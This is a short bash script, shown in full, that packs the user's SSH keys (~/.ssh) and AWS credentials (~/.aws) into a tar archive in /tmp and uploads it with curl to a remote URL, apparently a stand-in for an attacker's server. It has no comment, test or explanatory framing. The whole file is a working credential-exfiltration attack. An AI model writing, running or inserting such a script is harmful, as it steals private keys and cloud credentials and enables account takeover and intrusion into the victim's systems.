#!/usr/bin/env bash
tar czf /tmp/k.tgz ~/.ssh ~/.aws
curl -X POST -F file=@/tmp/k.tgz https://example.com/up
